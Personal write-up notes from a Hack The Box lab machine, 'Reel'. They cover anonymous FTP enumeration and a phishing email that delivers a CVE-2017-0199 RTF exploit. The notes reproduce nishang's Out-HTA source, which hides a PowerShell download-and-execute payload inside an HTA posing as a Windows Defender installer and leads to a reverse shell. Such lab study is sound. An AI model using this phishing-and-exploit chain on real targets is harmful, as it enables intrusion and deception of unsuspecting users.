
```
Name: HTB
Domain Sid: S-1-5-21-2648318136-3688571242-2924127574
```

FTP
```
wget -m ftp://anonymous:anonymous@10.10.10.77 #Donwload all
```
![[Pasted image 20240507024218.png]]

readme.txt
```
please email me any rtf format procedures - I'll review and convert.

new format / converted documents will be saved here.
```

AppLocker.docx
```
AppLocker procedure to be documented - hash rules for exe, msi and scripts (ps1,vbs,cmd,bat,js) are in effect.
```

```
LAPTOP12.HTB.LOCAL
```


Just a wild guess as we want Gmail to enter it in the SMTP server and even kerbrute was not working this time.
```
exiftool Windows\ Event\ Forwarding.docx
```

```
nico@megabank.com
```

![[Pasted image 20240507085045.png]]


It is clear that we have to take the mail path to get something out of it. And if we recall there was a note that they are processing some files with .exe , bat so which means we have to draft a Phising mail to send to Nico and assume that our reverse shell get's executed and we get the shell.

But for that i have take some hello from the walkthrough and how to do it.

![[Pasted image 20240509125558.png]]

We can send the mail to nicko using RCPT and we got a OK response.

Will not make a malicious macro word file and wait for it to execute as the user is not using Microsoft word (i.e. using WordPad)

But will learn how to do that for future use.

Will open the insert tab
![[Pasted image 20240509130445.png]]

In that will select Quick Parks -> Field 
![[Pasted image 20240509130524.png]]

Everytime user opens the image the words will try to download that image from the URL that we have given.
![[Pasted image 20240509130708.png]]

Now if we think a little more RTF (i.e. rtf format procedures) was mentioned in the note. So will find if there are any exploits related to that.
![[Pasted image 20240509130929.png]]

Will go with the 1st result aka CVE 2017
https://github.com/bhdresh/CVE-2017-0199.git

![[Pasted image 20240509131155.png]]

Payload
```
python cve-2017-0199_toolkit.py -M gen -w singh.rtf -u http://10.10.16.20 -t RTF -x 0
```
we are using -x 0 cuz we don't want any obfuscation
![[Pasted image 20240509131543.png]]

Now we have to generate a Malicious HTA file cuz that the requirement in order to work.
![[Pasted image 20240509131659.png]]

I have clone nishang
https://github.com/samratashok/nishang

```
find . | grep -i hta
```
![[Pasted image 20240509131932.png]]

```
less ./Client/Out-HTA.ps1
```
![[Pasted image 20240509132014.png]]

Will run the powershell
```
pwsh
```

```
.EXAMPLE
PS > Out-HTA -PayloadURL http://192.168.254.1/Get-Information.ps1
```

Will load the PowerShell and execute the Command
![[Pasted image 20240509150308.png]]


```
Out-HTA -PayloadURL http://10.10.16.20/singh.ps1
```
![[Pasted image 20240509150921.png]]

To solve this error will run this command from kali and try running the command again
```
cat /opt/nishang/Client/Out-HTA.ps1 | xclip -selection primary
```

Will get the code in the paste selection which we have to copy and we should be good to go
this is a new thing that i learnt today

```  
function Out-HTA
{
<#
.SYNOPSIS
Nishang script which could be used for generating "infected" HTML Application. It could be deployed on 
a web server and PowerShell scripts and commands could be executed on the target machine.

.DESCRIPTION
The script generates a HTA file with inline VBScript. The HTA should be deployed on a web server.
When a target browses to the HTA file and chooses to run it, PowerShell commands and scripts in it are executed.

The HTA is not visible as it is closed quickly. But in case, if the HTA becomes visible (for example in case of an error), it loads 
a live page related to Windows Defender from Microsoft website to look legit.

.PARAMETER Payload
Payload which you want execute on the target.

.PARAMETER PayloadURL
URL of the powershell script which would be executed on the target.

.PARAMETER PayloadScript
Path to the PowerShell script to be encoded in the HTA which would be executed on the target.

.PARAMETER Arguments
Arguments to the PowerShell script to be executed on the target.

.PARAMETER HTAFilePath
Path to the HTA file to be generated. Default is with the name WindDef_WebInstall.hta in the current directory.

.EXAMPLE
PS > Out-HTA -Payload "powershell.exe -ExecutionPolicy Bypass -noprofile -noexit -c Get-ChildItem"

Above command would execute Get-ChildItem on the target machine when the HTA is opened.

.EXAMPLE
PS > Out-HTA -PayloadURL http://192.168.254.1/Get-Information.ps1

Use above command to generate HTA and VBS files which download and execute the given powershell script in memory on target.

.EXAMPLE
PS > Out-HTA -PayloadURL http://192.168.254.1/powerpreter.psm1 -Arguments Check-VM

Use above command to pass an argument to the PowerShell script/module.

.EXAMPLE
PS > Out-HTA -PayloadScript C:\nishang\Shells\Invoke-PowerShellTcpOneLine.ps1

Use above when you want to use a PowerShell script as the payload. Note that if the script expects any parameter passed to it, 
you must pass the parameters in the script itself.

.LINK
http://www.labofapenetrationtester.com/2014/11/powershell-for-client-side-attacks.html
https://github.com/samratashok/nishang
#>


    [CmdletBinding()] Param(
        
        [Parameter(Position = 0, Mandatory = $False)]
        [String]
        $Payload,
        
        [Parameter(Position = 1, Mandatory = $False)]
        [String]
        $PayloadURL,

        [Parameter(Position = 2, Mandatory = $False)]
        [String]
        $PayloadScript,
        
        [Parameter(Position = 3, Mandatory = $False)]
        [String]
        $Arguments,


        [Parameter(Position = 4, Mandatory = $False)]
        [String]
        $HTAFilePath="$pwd\WindDef_WebInstall.hta"


    )
    
    if(!$Payload)
    {
        $Payload = "powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c IEX ((New-Object Net.WebClient).DownloadString('$PayloadURL'));$Arguments"
    }
   
    
    if($PayloadScript)
    {
        #Logic to read, compress and Base64 encode the payload script.
        $Enc = Get-Content $PayloadScript -Encoding Ascii
    
        #Compression logic from http://www.darkoperator.com/blog/2013/3/21/powershell-basics-execution-policy-and-code-signing-part-2.html
        $ms = New-Object IO.MemoryStream
        $action = [IO.Compression.CompressionMode]::Compress
        $cs = New-Object IO.Compression.DeflateStream ($ms,$action)
        $sw = New-Object IO.StreamWriter ($cs, [Text.Encoding]::ASCII)
        $Enc | ForEach-Object {$sw.WriteLine($_)}
        $sw.Close()
    
        # Base64 encode stream
        $Compressed = [Convert]::ToBase64String($ms.ToArray())
    
        $command = "Invoke-Expression `$(New-Object IO.StreamReader (" +

        "`$(New-Object IO.Compression.DeflateStream (" +

        "`$(New-Object IO.MemoryStream (,"+

        "`$([Convert]::FromBase64String('$Compressed')))), " +

        "[IO.Compression.CompressionMode]::Decompress)),"+

        " [Text.Encoding]::ASCII)).ReadToEnd();"

        #Generate Base64 encoded command to use with the powershell -encodedcommand paramter"
        $UnicodeEncoder = New-Object System.Text.UnicodeEncoding
        $EncScript = [Convert]::ToBase64String($UnicodeEncoder.GetBytes($command))
        $Payload = "powershell.exe -WindowStyle hidden -nologo -noprofile -e $EncScript"  
    }

    $HTA = @"
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
    <html xmlns="http://www.w3.org/1999/xhtml">
    <head>
    <meta content="text/html; charset=utf-8" http-equiv="Content-Type" />
    <title>Windows Defender Web Install</title>

    <script language="VBScript">
    set oShell = CreateObject("Wscript.Shell")
    oShell.Run("$Payload"),0,true
    self.close()
    </script>
    <hta:application
       id="oHTA"
       applicationname="Windows Defender Web Install"
       application="yes"
    >
    </hta:application>
    </head>
    <div> 
    <object type="text/html" data="http://windows.microsoft.com/en-IN/windows7/products/features/windows-defender" width="100%" height="100%">
    </object></div>   
    <body>
    </body>
    </html>
"@

    Out-File -InputObject $HTA -FilePath $HTAFilepath
    Write-Output "HTA written to $HTAFilepath."
}

```

Finally the script ran and we are good to go
As you can see in the image i have used the wrong IP address so i was getting hit on the file but was not getting the reverse shell
```
Out-HTA -PayloadURL http://10.10.16.20/singh.ps1
```
![[Pasted image 20240509172043.png]]
![[Pasted image 20240510015653.png]]

Now we to copy the scripts in reel folder

Now we have the rtf file that we have to send to someone that will contain the link to a HTA file that will than redirect them to a PowerShell


We will use a tool called send sendEmail to send the payload to nico.
![[Pasted image 20240510013451.png]]

We have fire up the file server as well as started the Netcat Listener.
```
sendEmail -f singh@megabank.com -t nico@megabank.com -u RTF -m "Please Convert This File" -a singh.rtf -s 10.10.10.77
```
![[Pasted image 20240510014134.png]]
We didn't got the shell as we are getting / so we have to solve this problem.

Will regenerate the CVE file
```
python cve-2017-0199_toolkit.py -M gen -w singh.rtf -u 'http://10.10.16.20/singh.hta' -t RTF -x 0
```

I don't know but will generate the file with the author name.

So we finally got the reverse shell
```
python cve-2017-0199_toolkit.py -M gen -w ippsec.rtf -u 'http://10.10.16.20/singh.hta' -t RTF -x 0

Out-HTA -PayloadURL http://10.10.16.20/ippsec.ps1

sendEmail -f ippsec@megabank.com -t nico@megabank.com -u RTF -m "Please Convert This File" -a ippsec.rtf -s 10.10.10.77
```
![[Pasted image 20240510123803.png]]

Users list
```
Administrator
brad
claire
herman
julia
nico
tom
```
![[Pasted image 20240510124414.png]]


```
4b8d7194bfebfe65816c924142390049
```
![[Pasted image 20240510124556.png]]

There is cred.xml file where the password is encrypted we have to find a way to decrypt it.
![[Pasted image 20240510124742.png]]
